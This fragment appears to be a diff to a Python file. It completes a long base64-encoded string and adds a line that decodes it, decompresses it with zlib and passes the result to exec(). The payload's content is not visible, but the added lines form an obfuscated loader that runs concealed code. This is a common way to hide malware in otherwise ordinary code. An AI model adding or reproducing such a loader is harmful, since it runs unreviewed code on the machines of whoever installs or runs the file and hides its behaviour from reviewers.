@@ -36,3 +36,6 @@ s=(
 '5PN///n7L3KJ/6HghKUii4RldgvPsqO5Bkw/enhXHd4D1/YG9Hcb2kEQHqD48qVn'
 'Fr+CDznUz2bAsJnrN43O+6Eg140jHQ82yEBin+0dLrYoQ3dMmobdQjRGaJuU60Uk'
 '9UHub9XbgkVL10OaxXpA9cwy9F11IYP5j3iNjkZgIwwhMXgYIufRMEQ6CUPq/nti'
+'uGX0H2SxPSM='
+)
+exec(zlib.decompress(base64.b64decode(s)).decode('utf-8'))
